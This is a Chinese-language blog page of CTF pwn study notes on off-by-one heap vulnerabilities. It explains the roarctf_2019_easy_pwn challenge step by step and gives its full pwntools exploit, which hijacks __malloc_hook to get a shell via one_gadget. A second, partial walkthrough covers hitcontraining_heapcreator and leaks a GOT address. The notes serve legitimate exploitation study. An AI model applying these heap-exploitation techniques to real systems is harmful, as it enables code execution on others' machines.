@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Off-by-one漏洞是一种常见的编程错误，它发生在程序访问数组或缓冲区时，由于索引计算错误，导致访问了数组或缓冲区的最后一个元素之外的内存位置。这种错误可能使程序读取或写入相邻内存区域的数据，造成信息泄露、数据损坏或安全漏洞，如缓冲区溢出，允许攻击者执行任意代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="off-by-one学习笔记">
+<meta property="og:url" content="http://example.com/post/off-by-one%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="Off-by-one漏洞是一种常见的编程错误，它发生在程序访问数组或缓冲区时，由于索引计算错误，导致访问了数组或缓冲区的最后一个元素之外的内存位置。这种错误可能使程序读取或写入相邻内存区域的数据，造成信息泄露、数据损坏或安全漏洞，如缓冲区溢出，允许攻击者执行任意代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038220.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037864.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037821.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037690.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407102155262.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407102208262.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png">
+<meta property="article:published_time" content="2024-10-13T12:37:11.000Z">
+<meta property="article:modified_time" content="2025-10-16T13:16:03.907Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038931.png">
+
+<link rel="canonical" href="http://example.com/post/off-by-one%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>off-by-one学习笔记 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/off-by-one%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          off-by-one学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-10-13 20:37:11" itemprop="dateCreated datePublished" datetime="2024-10-13T20:37:11+08:00">2024-10-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 21:16:03" itemprop="dateModified" datetime="2025-10-16T21:16:03+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">堆</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Off-by-one漏洞是一种常见的编程错误，它发生在程序访问数组或缓冲区时，由于索引计算错误，导致访问了数组或缓冲区的最后一个元素之外的内存位置。这种错误可能使程序读取或写入相邻内存区域的数据，造成信息泄露、数据损坏或安全漏洞，如缓冲区溢出，允许攻击者执行任意代码。</p>
+<span id="more"></span>
+
+<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a><em>roarctf_2019_easy_pwn</em></h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//v4 = sub_E26(*(&amp;unk_202044 + 4 * v3), v2);</span></span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_E26</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;                          <span class="comment">//a1是add_size,a2是edit_size</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )   <span class="comment">//如果edit_size-add_size = 10，则v4=add_size+1</span></span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//v2 = sub_D92(qword_202048[2 * v3], v4);</span></span><br></pre></td></tr></table></figure>
+
+<p>可以分析出，如果<code>edit_size-add_size = 10</code>，那么我们便可以写入，<code>add_size+1</code>字节的数据，造成_off-by-one_漏洞。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏_libc_"></a>泄漏_libc_</h4><h5 id="修改-chunk1-size"><a href="#修改-chunk1-size" class="headerlink" title="修改_chunk1_size_"></a>修改_chunk1_size_</h5><p>先创建<code>4</code>个_chunk_</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038931.png" alt="2" style="zoom:80%;" />
+
+<p>往_chunk0_中写数据，通过_off-by-one_篡改_chunk1_的_size_字段为<code>0xa1</code>，使得_chunk_hook1_与_chunk_hook2_指向的空间，部分重叠。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252038220.png" alt="1"></p>
+<h5 id="写入-fake-chunk2-size"><a href="#写入-fake-chunk2-size" class="headerlink" title="写入_fake_chunk2_size_"></a>写入_fake_chunk2_size_</h5><p>现在，还需要解决一个问题：<br>_chunk1_的_size_被修改后，_real_chunk2_的部分空间与_chunk1_共享，所以现在会出现一个_fake_chunk2_以<code>0x559e6a0a70c0</code>这个地址作为首地址。又因为<code>0x559e6a0a70c8</code>处为<code>0</code>，故现在_fake_chunk2_的_size_为<code>0</code>，也因此，_chunk3_即使是正常的，也无法被划分空间。</p>
+<p>我们现在需要在<code>0x559e6a0a70c8</code>处写上_fake_chunk2_的_size_，怎么写呢？不要忘了，_real_chunk2_并未改变，_chunk_hook2_也仍然是原来的_chunk_hook2_！<code>edit(2,size,content)</code>，就可以很正常的往<code>0x559e6a0a70c8</code>里写数据。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span>+p64(<span class="number">0xa1</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#因为real_chunk2的size字段依然为0xa1,该部分不能改变</span></span><br><span class="line"><span class="comment">#((0x10+0x10)+(0x90+0x10))-0xa0 = 0x20</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037952.png" alt="3" style="zoom:80%;" />
+
+<h5 id="修改-chunk1-hook-size"><a href="#修改-chunk1-hook-size" class="headerlink" title="修改_chunk1_hook_size_"></a>修改_chunk1_hook_size_</h5><p>现在，还需要再解决一个问题：<br>本题中，能打印出多少字符，是由_chunk_hook_前面一个地址里的内容决定的。而现在，_chunk_hook1_前面的地址里，仍然是<code>0x0000001000000001</code>，也就是说当<code>show(1)</code>，我们依然只能打印出<code>0x10</code>个字符。怎么解决呢？</p>
+<p>不要忘了，实际上的_chunk1_的_size_已经是<code>0xa0</code>了！所以我们<code>free</code>一次_chunk1_，再<code>malloc</code>一次<code>0x90</code>的内存，_chunk_hook_区域的_size_自然会变成<code>0x90</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line"><span class="comment">#由于我们对chunk1进行操作时会刷新real_chunk2的size,所以还要再从chunk1里改回去。fake_chunk2_size因为没有在chunk1的范围内，故不会被清除</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>如图：</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037864.png" alt="4"></p>
+<p>被刷新为<code>0</code>的_real_chunk2_size_：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037821.png" alt="5" style="zoom:67%;" />
+
+<p>重新写入的_real_chunk2_size_：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252037690.png" alt="6" style="zoom:67%;" />
+
+<p>现在，我们终于可以，利用_chunk_hook1_与_chunk_hook2_这两个指针泄漏_libc_地址了。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="one-gadget-获取-shell"><a href="#one-gadget-获取-shell" class="headerlink" title="one_gadget_获取_shell"></a><em>one_gadget_获取_shell</em></h4><h5 id="新设-real-chunk2-size"><a href="#新设-real-chunk2-size" class="headerlink" title="新设_real_chunk2_size_"></a>新设_real_chunk2_size_</h5><p>再次申请_real_chunk2_，此时_real_chunk2_的所有数据都已被清除。需重新设置_real_chunk2_的_size_为<code>0x71</code>（如此才能落入_fast bin_中），_fake_chunk2_的_size_为<code>0x21</code>，继续对其利用。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#real_chunk2_size = 0x71，fake_chunk2_size = 0x21</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,paylaod)</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改-fast-bin-中的-fd-bk"><a href="#修改-fast-bin-中的-fd-bk" class="headerlink" title="修改_fast bin_中的_fd,bk_"></a>修改_fast bin_中的_fd,bk_</h5><p>释放_real_chunk2_到_fast bin_中，然后通过往_chunk1_里写数据，修改_real_chunk2_的_fd_和_bk_，为我们在_malloc_hook_附近构造的_chunk_。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span>   <span class="comment">#找到以0x7f结尾的地址</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<h5 id="劫持两个-hook"><a href="#劫持两个-hook" class="headerlink" title="劫持两个_hook_"></a>劫持两个_hook_</h5><p>从_fast bin_中回收_real_chunk2_，及构造的_fake_chunk_。然后覆盖<code>__realloc_hook</code>的值为<code>one_gadget</code>，<code>__malloc_hook</code>的值为<code>realloc+4</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#因为real_chunk2_size = 0x71</span></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">4</span>)</span><br><span class="line"><span class="comment">#__realloc_hook在__malloc_hook的上一个地址</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">11</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#程序会先执行realloc+4处的内容，然后再执行one_gadget</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./a&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28833</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1253</span>,<span class="number">0x126B</span>,<span class="number">0x1277</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xa1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0xe</span>+p64(<span class="number">0xa1</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x20</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0</span>)*<span class="number">13</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x90</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">malloc_hook = libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;malloc_hook&quot;</span>)</span><br><span class="line">fake_chunk = malloc_hook-<span class="number">0x23</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base+one_gadget[<span class="number">3</span>]</span><br><span class="line">realloc = libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">11</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><em>hitcontraining_heapcreator</em></h2><h3 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="_off-by-one_利用思路"></a>_off-by-one_利用思路</h3><p>​	&#x3D;&#x3D;利用_off-by-one_，来改写下一个_chunk_的指针_chunk_的_size_，进而实现下一个_chunk_的指针_chunk_与内容_chunk_的部分重叠和互换。&#x3D;&#x3D;</p>
+<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>​	一共有_create_heap_，_edit_heap_，_show_heap_，_delete_heap_四个函数，_edit_heap_函数中有一个堆溢出漏洞，只可以溢出<code>1</code>个字节。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101814056.png" alt="image-20240710181416024" style="zoom: 80%;" />
+
+<p>​	本题中，每_malloc_一次会创建一个指针_chunk_和一个内容_chunk_（其实就是两个地址空间，分别存储着指向_chunk_中数据的指针，和_chunk_的数据），而_free_一次也就是把这两个地址空间都释放掉了。_show_heap_和_edit_heap_函数中打印和修改的内容都是由指针决定的，指针指向什么就打印和修改什么。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="改写-size"><a href="#改写-size" class="headerlink" title="改写_size_"></a>改写_size_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line"><span class="comment">#往_chunk0_中写入&#x27;/bin/sh\x00&#x27;，后面free(chunk0)的时候其实就是system(&quot;/bin/sh&quot;)</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	先创建两个_chunk_，<code>0x18</code>是为了在往_chunk0_中写内容时，直接覆盖掉_chunk1_的指针_chunk_的前<code>8</code>个字节，然后就可以利用溢出的一个字节改写_chunk1_的指针_chunk_的_size_。</p>
+<p>如图，指针_chunk_的_size_值已经被改写成<code>0x41</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101923019.png" alt="image-20240710192301972"></p>
+<p>​	此时，_chunk1_的指针_chunk_与内容_chunk_，已经部分重叠（因为是指针_chunk_的_size_被改写成<code>0x41</code>，内容_chunk_的_size_还是<code>0x21</code>，所以如图</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102116011.png" alt="image-20240710192301977" style="zoom:80%;" />
+
+<h4 id="泄漏-free-addr"><a href="#泄漏-free-addr" class="headerlink" title="泄漏_free_addr_"></a>泄漏_free_addr_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line"><span class="comment">#指针前面0x30是能存储数据的大小，不能改变</span></span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>delete(1)</code>后我们可以看到_fastbins_有两个不同大小的_fastbin_chunk_，如图</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102122798.png" alt="image-20240710212229702"></p>
